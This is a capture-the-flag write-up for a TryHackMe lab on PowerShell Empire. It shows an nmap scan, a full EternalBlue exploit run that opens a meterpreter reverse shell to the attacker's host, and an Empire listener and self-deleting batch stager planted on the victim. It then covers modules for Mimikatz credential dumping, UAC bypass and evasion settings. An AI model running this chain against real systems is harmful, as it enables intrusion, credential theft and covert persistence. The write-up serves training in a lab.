# PS Empire

Learn how to use Powershell Empire, a powerful post-exploitation framework.

[PS Empire](https://tryhackme.com/room/rppsempire)

## Deploy!

Deploy this machine and discover what exploit this machine is vulnerable to. (Hint hint, this notice the VM name. I recommend completing the room 'Blue' prior to this room for this purpose alone.)

----------------------------------------------------

Enjoy the room! For future rooms and write-ups, follow [@darkstar7471](https://twitter.com/darkstar7471) on Twitter.

1. Deploy this machine and learn what exploitation this box is susceptible to!

```
kali@kali:~/CTFs/tryhackme/PS Empire$ sudo nmap -A -p- --script vuln 10.10.80.135
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-03 22:18 CEST
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 10.10.80.135
Host is up (0.032s latency).
Not shown: 65526 closed ports
PORT      STATE SERVICE            VERSION
135/tcp   open  msrpc              Microsoft Windows RPC
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
445/tcp   open  microsoft-ds       Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
3389/tcp  open  ssl/ms-wbt-server?
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
| rdp-vuln-ms12-020: 
|   VULNERABLE:
|   MS12-020 Remote Desktop Protocol Denial Of Service Vulnerability
|     State: VULNERABLE
|     IDs:  CVE:CVE-2012-0152
|     Risk factor: Medium  CVSSv2: 4.3 (MEDIUM) (AV:N/AC:M/Au:N/C:N/I:N/A:P)
|           Remote Desktop Protocol vulnerability that could allow remote attackers to cause a denial of service.
|           
|     Disclosure date: 2012-03-13
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0152
|       http://technet.microsoft.com/en-us/security/bulletin/ms12-020
|   
|   MS12-020 Remote Desktop Protocol Remote Code Execution Vulnerability
|     State: VULNERABLE
|     IDs:  CVE:CVE-2012-0002
|     Risk factor: High  CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)
|           Remote Desktop Protocol vulnerability that could allow remote attackers to execute arbitrary code on the targeted system.
|           
|     Disclosure date: 2012-03-13
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0002
|_      http://technet.microsoft.com/en-us/security/bulletin/ms12-020
|_sslv2-drown: 
49152/tcp open  msrpc              Microsoft Windows RPC
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
49153/tcp open  msrpc              Microsoft Windows RPC
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
49154/tcp open  msrpc              Microsoft Windows RPC
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
49158/tcp open  msrpc              Microsoft Windows RPC
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
49160/tcp open  msrpc              Microsoft Windows RPC
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=10/3%OT=135%CT=1%CU=36932%PV=Y%DS=2%DC=T%G=Y%TM=5F78DD
OS:56%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10B%TI=I%CI=I%II=I%SS=S%TS
OS:=7)OPS(O1=M508NW8ST11%O2=M508NW8ST11%O3=M508NW8NNT11%O4=M508NW8ST11%O5=M
OS:508NW8ST11%O6=M508ST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=20
OS:00)ECN(R=Y%DF=Y%T=80%W=2000%O=M508NW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=
OS:S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y
OS:%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD
OS:=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0
OS:%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1
OS:(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI
OS:=N%T=80%CD=Z)

Network Distance: 2 hops
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/

TRACEROUTE (using port 21/tcp)
HOP RTT      ADDRESS
1   31.72 ms 10.8.0.1
2   31.92 ms 10.10.80.135

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 199.86 seconds
```

2. Exploit the vulnerability to spawn a reverse shell!

```
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
```

```
msf5 > search ms17-010

Matching Modules
================

   #  Name                                           Disclosure Date  Rank     Check  Description
   -  ----                                           ---------------  ----     -----  -----------
   0  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   1  auxiliary/scanner/smb/smb_ms17_010                              normal   No     MS17-010 SMB RCE Detection
   2  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   3  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
   4  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   5  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution


Interact with a module by name or index, for example use 5 or use exploit/windows/smb/smb_doublepulsar_rce

msf5 > use 2
[*] Using configured payload windows/x64/meterpreter/reverse_tcp
msf5 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT          445              yes       The target port (TCP)
   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.178.52   yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows 7 and Server 2008 R2 (x64) All Service Packs


msf5 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 10.8.106.222
LHOST => 10.8.106.222
msf5 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.80.135
RHOSTS => 10.10.80.135
msf5 exploit(windows/smb/ms17_010_eternalblue) > exploit

[*] Started reverse TCP handler on 10.8.106.222:4444 
[*] 10.10.80.135:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.80.135:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.80.135:445      - Scanned 1 of 1 hosts (100% complete)
[*] 10.10.80.135:445 - Connecting to target for exploitation.
[+] 10.10.80.135:445 - Connection established for exploitation.
[+] 10.10.80.135:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.80.135:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.80.135:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.80.135:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.80.135:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.80.135:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.80.135:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.80.135:445 - Sending all but last fragment of exploit packet
[*] 10.10.80.135:445 - Starting non-paged pool grooming
[+] 10.10.80.135:445 - Sending SMBv2 buffers
[+] 10.10.80.135:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.80.135:445 - Sending final SMBv2 buffers.
[*] 10.10.80.135:445 - Sending last fragment of exploit packet!
[*] 10.10.80.135:445 - Receiving response from exploit packet
[+] 10.10.80.135:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.80.135:445 - Sending egg to corrupted connection.
[*] 10.10.80.135:445 - Triggering free of corrupted buffer.
[-] 10.10.80.135:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[-] 10.10.80.135:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=FAIL-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[-] 10.10.80.135:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[*] 10.10.80.135:445 - Connecting to target for exploitation.
[+] 10.10.80.135:445 - Connection established for exploitation.
[+] 10.10.80.135:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.80.135:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.80.135:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.80.135:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.80.135:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.80.135:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.80.135:445 - Trying exploit with 17 Groom Allocations.
[*] 10.10.80.135:445 - Sending all but last fragment of exploit packet
[*] 10.10.80.135:445 - Starting non-paged pool grooming
[+] 10.10.80.135:445 - Sending SMBv2 buffers
[+] 10.10.80.135:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.80.135:445 - Sending final SMBv2 buffers.
[*] 10.10.80.135:445 - Sending last fragment of exploit packet!
[*] 10.10.80.135:445 - Receiving response from exploit packet
[+] 10.10.80.135:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.80.135:445 - Sending egg to corrupted connection.
[*] 10.10.80.135:445 - Triggering free of corrupted buffer.
[*] Sending stage (201283 bytes) to 10.10.80.135
[*] Meterpreter session 1 opened (10.8.106.222:4444 -> 10.10.80.135:49185) at 2020-10-03 22:28:34 +0200
[+] 10.10.80.135:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.80.135:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.80.135:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

meterpreter > shell
Process 2240 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>
```

## Install

PowerShell Empire is a powerful post-exploitation framework which allows us to perform various functions such as privesc, password gathering, situational awareness, and many more!

Link to the official website: [https://www.bc-security.org/post/the-empire-3-0-strikes-back](https://www.bc-security.org/post/the-empire-3-0-strikes-back)

Clone the following GitHub page and run the initial setup script.
[https://github.com/BC-SECURITY/Empire/](https://github.com/BC-SECURITY/Empire/)

1. cd /opt

`No answer needed`

2. git clone https://github.com/BC-SECURITY/Empire/

`No answer needed`

3. cd /opt/Empire

`No answer needed`

4. ./setup/install.sh

`No answer needed`

5. When prompted, enter in a server negotiation password. This can be left blank for random generation, however, you should record this somewhere such as a LastPass vault.

`No answer needed`

6. Launch Empire with either ./empire or /opt/Empire/empire

`No answer needed`

## Listeners

If you're going to play ball, first you have to learn how to catch. Similar to 'catching' a reverse shell with Netcat, we first have to set up a listener in order to properly handle any sort of agent we would install on our victim machine. Answer the following questions using the listeners help menu and then spawn a basic listener.

1. Once empire has launched, type help to view the various menus. Which menu to we launch to access listeners?

```
(Empire) > help

Commands
========
agents            Jump to the Agents menu.
creds             Add/display credentials to/from the database.
exit              Exit Empire
help              Displays the help menu.
interact          Interact with a particular agent.
keyword           Add keyword to database for obfuscation
list              Lists active agents or listeners.
listeners         Interact with active listeners.
load              Loads Empire modules from a non-standard folder.
plugin            Load a plugin file to extend Empire.
plugins           List all available and active plugins.
preobfuscate      Preobfuscate PowerShell module_source files
reload            Reload one (or all) Empire modules.
report            Produce report CSV and log files: sessions.csv, credentials.csv, master.log
reset             Reset a global option (e.g. IP whitelists).
resource          Read and execute a list of Empire commands from a file.
searchmodule      Search Empire module names/descriptions.
set               Set a global option (e.g. IP whitelists).
show              Show a global option (e.g. IP whitelists).
uselistener       Use an Empire listener module.
usemodule         Use an Empire module.
usestager         Use an Empire stager.

(Empire) >
```

> `listeners         Interact with active listeners.`

`listeners`

2. Launch the listeners menu. In a manner similar to cobalt strike/metasploit, this will launch a contextual submenu. For the sake of this tutorial, we will be using an http listener in order to catch our connections. Type the command 'uselistener http' now. You can double-tap tab to view all options for listeners following typing 'uselistener'

```
(Empire) > listeners
[!] No listeners currently active 
(Empire: listeners) > uselistener http
(Empire: listeners/http) > 
```

`No answer needed`

3. What command can we now type to view all of the options related to our selected listener type?

```
(Empire: listeners/http) > help

Listener Commands
=================
agents            Jump to the agents menu.
back              Go back a menu.
creds             Display/return credentials from the database.
execute           Execute the given listener module.
exit              Exit Empire.
help              Displays the help menu.
info              Display listener module options.
launcher          Generate an initial launcher for this listener.
listeners         Jump to the listeners menu.
main              Go back to the main menu.
resource          Read and execute a list of Empire commands from a file.
set               Set a listener option.
unset             Unset a listener option.

(Empire: listeners/http) > info

    Name: HTTP[S]
Category: client_server

Authors:
  @harmj0y

Description:
  Starts a http[s] listener (PowerShell or Python) that uses a
  GET/POST approach.

HTTP[S] Options:

  Name              Required    Value                            Description
  ----              --------    -------                          -----------
  Name              True        http                             Name for the listener.
  Host              True        http://192.168.178.52            Hostname/IP for staging.
  BindIP            True        0.0.0.0                          The IP to bind to on the control server.
  Port              True                                         Port for the listener.
  Launcher          True        powershell -noP -sta -w 1 -enc   Launcher string.
  StagingKey        True        (_2>^3n|1C94SaB&,!i;MPq5/[XAgUsv Staging key for initial agent negotiation.
  DefaultDelay      True        5                                Agent delay/reach back interval (in seconds).
  DefaultJitter     True        0.0                              Jitter in agent reachback interval (0.0-1.0).
  DefaultLostLimit  True        60                               Number of missed checkins before exiting
  DefaultProfile    True        /admin/get.php,/news.php,/login/ Default communication profile for the agent.
                                process.php|Mozilla/5.0 (Windows
                                NT 6.1; WOW64; Trident/7.0;
                                rv:11.0) like Gecko
  CertPath          False                                        Certificate path for https listeners.
  KillDate          False                                        Date for the listener to exit (MM/dd/yyyy).
  WorkingHours      False                                        Hours for the agent to operate (09:00-17:00).
  Headers           True        Server:Microsoft-IIS/7.5         Headers for the control server.
  Cookie            False       jlJBeiGTEBCfbuZ                  Custom Cookie Name
  StagerURI         False                                        URI for the stager. Must use /download/. Example: /download/stager.php
  UserAgent         False       default                          User-agent string to use for the staging request (default, none, or other).
  Proxy             False       default                          Proxy to use for request (default, none, or other).
  ProxyCreds        False       default                          Proxy credentials ([domain\]username:password) to use for request (default, none, or other).
  SlackURL          False                                        Your Slack Incoming Webhook URL to communicate with your Slack instance.


(Empire: listeners/http) >
```

`info`

4. Once the information regarding the listener pops up, peruse this for some of the more interesting options we can set in order to disguise our actions more. Which option can we use to set specific times when our listener will be active?

> `WorkingHours      False                                        Hours for the agent to operate (09:00-17:00).`

`WorkingHours`

5. Similar to changing/spoofing what browser you are using on the internet, what option can we set to appear as a different user agent (i.e. chrome, firefox, etc)?

DefaultProfile    True /admin/get.php,/news.php,/login/ process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko    Default communication profile for the agent.

`DefaultProfile`

1. What option can we use to set the port which the listener will bind to?

> `Port              True                                         Port for the listener.`

`Port`

2. In addition to changing our browser profile, we can change what our server appears as. What option can we set to change this? 

> Depending on the context of the help menu you have up, this option might not show up (this is a rare case though). To provide further context to this question,
> the server version can effective change your listener to appear as Microsoft IIS or possibly Apache. It's all about obfuscation in this context. 

`ServerVersion`

3. Launch our newly created listener on port 80 with the command 'execute'. What message is displayed following successfully launching the listener?

```
(Empire: listeners/http) > set Port 4444
(Empire: listeners/http) > execute
[*] Starting listener 'http'
 * Serving Flask app "http" (lazy loading)
 * Environment: production
   WARNING: This is a development server. Do not use it in a production deployment.
   Use a production WSGI server instead.
 * Debug mode: off
[+] Listener successfully started!
(Empire: listeners/http) >
```

`Listener successfully started!`

4.  We can verify that our listener is now active by typing what command?

```
(Empire: listeners/http) > listeners

[*] Active listeners:

  Name              Module          Host                                 Delay/Jitter   KillDate
  ----              ------          ----                                 ------------   --------
  http              http            http://192.168.178.52:4444           5/0.0                      
```

## Stagers

Stagers metaphorically and literally set the stage for post-exploitation by retrieving the remaining code and associated information necessary to spawn a full-fledged agent.

1. First, type the command 'usestager' and double-tap tab to view all options we have for stagers. Which option allows us to use a batch file?

```
(Empire: listeners) > usestager 
multi/bash                osx/applescript           osx/launcher              osx/shellcode             windows/dll               windows/launcher_sct      windows/shellcode
multi/launcher            osx/application           osx/macho                 osx/teensy                windows/ducky             windows/launcher_vbs      windows/teensy
multi/macro               osx/ducky                 osx/macro                 windows/backdoorLnkMacro  windows/hta               windows/launcher_xml      windows/wmic
multi/pyinstaller         osx/dylib                 osx/pkg                   windows/bunny             windows/launcher_bat      windows/macro             
multi/war                 osx/jar                   osx/safari_launcher       windows/csharp_exe        windows/launcher_lnk      windows/macroless_msword
```

`windows/launcher_bat`

2. Let's finish our previous command and select the batch file option. Press enter to finalize this. What is our new path to the 'module' we have selected?

```
(Empire: listeners) > usestager windows/launcher_bat
(Empire: stager/windows/launcher_bat) >
```

`stager/windows/launcher_bat`

3. Since we've previously set our listener to use http, we must now set the associated options within our stager we are building to match that. What option must we set in order to accomplish this?

```
(Empire: stager/windows/launcher_bat) > info

Name: BAT Launcher

Description:
  Generates a self-deleting .bat launcher for
  Empire.

Options:

  Name             Required    Value             Description
  ----             --------    -------           -----------
  Listener         True                          Listener to generate stager for.
  Language         True        powershell        Language of the stager to generate.
  StagerRetries    False       0                 Times for the stager to retry
                                                 connecting.
  OutFile          False       /tmp/launcher.bat File to output .bat launcher to,
                                                 otherwise displayed on the screen.
  Delete           False       True              Switch. Delete .bat after running.
  Obfuscate        False       False             Switch. Obfuscate the launcher
                                                 powershell code, uses the
                                                 ObfuscateCommand for obfuscation types.
                                                 For powershell only.
  ObfuscateCommand False       Token\All\1       The Invoke-Obfuscation command to use.
                                                 Only used if Obfuscate switch is True.
                                                 For powershell only.
  UserAgent        False       default           User-agent string to use for the staging
                                                 request (default, none, or other).
  Proxy            False       default           Proxy to use for request (default, none,
                                                 or other).
  ProxyCreds       False       default           Proxy credentials
                                                 ([domain\]username:password) to use for
                                                 request (default, none, or other).
  AMSIBypass       False       True              Include mattifestation's AMSI Bypass in
                                                 the stager code.
  AMSIBypass2      False       False             Include Tal Liberman's AMSI Bypass in
                                                 the stager code.
```

> `Listener         True                          Listener to generate stager for.`

`Listener`

4. Type execute to finish creating our stager. Where is the stager saved?

```
(Empire: stager/windows/launcher_bat) > set Listener http1
(Empire: stager/windows/launcher_bat) > execute

[*] Stager output written out to: /tmp/launcher.bat
```

`/tmp/launcher.bat`

5. Using any shell you have previously gained into our victim system transport the stager batch file to the system and execute it. This can be done in numerous ways depending on the stager used, be prepared to be flexible with your transportation methods similarly to how you might handle an msfvenom package. 

```
exit
meterpreter > upload /tmp/launcher.bat launcher.bat
[*] uploading  : /tmp/launcher.bat -> launcher.bat
[*] Uploaded 5.13 KiB of 5.13 KiB (100.0%): /tmp/launcher.bat -> launcher.bat
[*] uploaded   : /tmp/launcher.bat -> launcher.bat
meterpreter > shell
Process 1924 created.
Channel 5 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>launcher.bat
launcher.bat

C:\Windows\system32>
```

```
(Empire: stager/windows/launcher_bat) > 
[*] Sending POWERSHELL stager (stage 1) to 10.10.80.135
[*] New agent FKRDZB8C checked in
[+] Initial agent FKRDZB8C from 10.10.80.135 now active (Slack)
[*] Sending agent (stage 2) to FKRDZB8C at 10.10.80.135

(Empire: stager/windows/launcher_bat) >
```

`No answer needed`

## Agents and Post-Exploitation

Interact with our ses.. er agents and do neat things.

1. First, type agents to view our registered agents.

`No answer needed`

2. Once you've typed agents to list the registered agents, the agents submenu will become active. Use the help menu to answer the following questions.

`No answer needed`

3. What command do we use to interact with an agent?

```
(Empire: stager/windows/launcher_bat) > agents

[*] Active agents:

 Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener
 ----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------
 FKRDZB8C ps 10.10.80.135    JON-PC            *WORKGROUP\SYSTEM       powershell         2492   5/0.0    2020-10-03 23:26:43  http1           

(Empire: agents) > interact FKRDZB8C
(Empire: FKRDZB8C) >
```

`interact`

4. What about if we wanted to list any usernames and passwords we have gathered?

```
(Empire: FKRDZB8C) > creds

Credentials:

  CredID  CredType   Domain                   UserName         Host             Password
  ------  --------   ------                   --------         ----             --------
```

`creds`

5. And if we wanted to 'deactivate' an agent for a while to avoid detection?

```
(Empire: FKRDZB8C) > sleep
(Empire: FKRDZB8C) >
```

`sleep`

6. How about if we wanted to delete an agent or disconnect it?

```
(Empire: FKRDZB8C) > kill
[!] Please enter a process name or ID.
```

`kill`

7. Moving into the post exploitation modules, what command can we use to search through these?

```
(Empire: FKRDZB8C) > searchmodule
[!] Please enter a search term.
```

`searchmodule`

8. We'll start with the most important module, find the module which plays a specific AC/DC song.

```
(Empire: FKRDZB8C) > searchmodule thunderstruck

 python/trollsploit/osx/thunderstruck

        Open Safari in the background and play Thunderstruck.


 powershell/trollsploit/thunderstruck

        Play's a hidden version of AC/DC's Thunderstruck video while maxing
        out a computer's volume.
```

`powershell/trollsploit/thunderstruck`

9.  What if we wanted to perform an lsa dump with a certain popular windows credential gathering tool?

```
(Empire: FKRDZB8C) > searchmodule lsa

 powershell/credentials/invoke_internal_monologue*

        Uses the Internal Monologue attack to force easily-decryptable Net-
        NTLMv1 responses over localhost and without directly touching LSASS.
        https://github.com/eladshamir/Internal-Monologue


 powershell/credentials/mimikatz/dcsync

        Runs PowerSploit's Invoke-Mimikatz function to extract a given account
        password through Mimikatz's lsadump::dcsync module. This doesn't need
        code execution on a given DC, but needs to be run from a user context
        with DA equivalent privileges.


 powershell/credentials/mimikatz/lsadump*

        Runs PowerSploit's Invoke-Mimikatz function to extract a particular
        user hash from memory. Useful on domain controllers.


 powershell/credentials/mimikatz/dcsync_hashdump

        Runs PowerSploit's Invoke-Mimikatz function to collect all domain
        hashes using Mimikatz'slsadump::dcsync module. This doesn't need code
        execution on a given DC, but needs to be run froma user context with
        DA equivalent privileges.


 powershell/credentials/mimikatz/pth*

        Runs PowerSploit's Invoke-Mimikatz function to execute sekurlsa::pth
        to create a new process. with a specific user's hash. Use
        credentials/tokens to steal the token afterwards.


 powershell/collection/minidump

        Generates a full-memory dump of a process. Note: To dump another
        user's process, you must be running from an elevated prompt (e.g to
        dump lsass)


 powershell/management/honeyhash*

        Inject artificial credentials into LSASS.
```

```
 powershell/credentials/mimikatz/lsadump*

        Runs PowerSploit's Invoke-Mimikatz function to extract a particular
        user hash from memory. Useful on domain controllers.
```

10. Sometime we might not have the permissions level that we require to perform further actions, what module set might we have to use to get around UAC?

```
(Empire: FKRDZB8C) > searchmodule uac

 powershell/situational_awareness/host/get_uaclevel

        Enumerates UAC level


 powershell/privesc/bypassuac_wscript

        Drops wscript.exe and a custom manifest into C:\Windows\ and then
        proceeds to execute VBScript using the wscript executablewith the new
        manifest. The VBScript executed by C:\Windows\wscript.exe will run
        elevated.


 powershell/privesc/bypassuac_env

        Bypasses UAC (even with Always Notify level set) by by performing an
        registry modification of the "windir" value in "Environment" based on
        James Forshaw
        findings(https://tyranidslair.blogspot.cz/2017/05/exploiting-
        environment-variables-in.html)


 powershell/privesc/bypassuac_tokenmanipulation

        Bypass UAC module based on the script released by Matt Nelson
        @enigma0x3 at Derbycon 2017


 powershell/privesc/bypassuac_sdctlbypass

        Bypasses UAC by performing an registry modification for sdclt (based
        onhttps://enigma0x3.net/2017/03/17/fileless-uac-bypass-using-sdclt-
        exe/)


 powershell/privesc/bypassuac_eventvwr

        Bypasses UAC by performing an image hijack on the .msc file extension
        and starting eventvwr.exe. No files are dropped to disk, making this
        opsec safe.


 powershell/privesc/ask

        Leverages Start-Process' -Verb runAs option inside a YES-Required loop
        to prompt the user for a high integrity context before running the
        agent code. UAC will report Powershell is requesting Administrator
        privileges. Because this does not use the BypassUAC DLLs, it should
        not trigger any AV alerts.


 powershell/privesc/bypassuac_fodhelper

        Bypasses UAC by performing an registry modification for FodHelper
        (based onhttps://winscripting.blog/2017/05/12/first-entry-welcome-and-
        uac-bypass/)


 powershell/privesc/bypassuac

        Runs a BypassUAC attack to escape from a medium integrity process to a
        high integrity process. This attack was originally discovered by Leo
        Davidson. Empire uses components of MSF's bypassuac injection
        implementation as well as an adapted version of PowerSploit's Invoke--
        Shellcode.ps1 script for backend lifting.
```

`bypassuac`

11. What module family allows us to gather additional information about the network we are on?

```
(Empire: FKRDZB8C) > searchmodule network

 python/situational_awareness/network/port_scan

        Simple Port Scanner.


 python/situational_awareness/network/gethostbyname

        Uses Python's socket.gethostbyname("example.com") function to resolve
        host names on a remote agent.


 python/situational_awareness/network/smb_mount

        This module will attempt mount an smb share and execute a command on
        it.


 python/situational_awareness/network/find_fruit

        Searches for low-hanging web applications.


 python/situational_awareness/network/http_rest_api

        Interacts with a HTTP REST API and returns the results back to the
        screen.


 python/situational_awareness/network/active_directory/get_fileservers

        This module will list file servers


 python/situational_awareness/network/active_directory/get_groups

        This module will list all groups in active directory


 python/situational_awareness/network/active_directory/get_ous

        This module will list all OUs from active directory


 python/situational_awareness/network/active_directory/get_userinformation

        This module will return the user profile specified


 python/situational_awareness/network/active_directory/dscl_get_users

        This module will use the current user context to query active
        directory for a list of users.


 python/situational_awareness/network/active_directory/get_users

        This module list users found in Active Directory


 python/situational_awareness/network/active_directory/get_domaincontrollers

        This module will list all domain controllers from active directory


 python/situational_awareness/network/active_directory/get_groupmembers

        This module will return a list of group members


 python/situational_awareness/network/active_directory/dscl_get_groupmembers

        This module will use the current user context to query active
        directory for a list of users in a group.


 python/situational_awareness/network/active_directory/get_computers

        This module will list all computer objects from active directory


 python/situational_awareness/network/active_directory/get_groupmemberships

        This module check what groups a user is member of


 python/situational_awareness/network/active_directory/dscl_get_groups

        This module will use the current user context to query active
        directory for a list of Groups.


 python/situational_awareness/network/dcos/chronos_api_start_job

        Start a Chronos job using the HTTP API service for the Chronos
        Framework


 python/situational_awareness/network/dcos/etcd_crawler

        Pull keys and values from an etcd configuration store


 python/situational_awareness/network/dcos/marathon_api_delete_app

        Delete a Marathon App using Marathon's REST API


 python/situational_awareness/network/dcos/chronos_api_add_job

        Add a Chronos job using the HTTP API service for the Chronos Framework


 python/situational_awareness/network/dcos/chronos_api_delete_job

        Delete a Chronos job using the HTTP API service for the Chronos
        Framework


 python/situational_awareness/network/dcos/marathon_api_create_start_app

        Create and Start a Marathon App using Marathon's REST API


 python/collection/osx/sniffer*

        This module will do a full network stack capture.


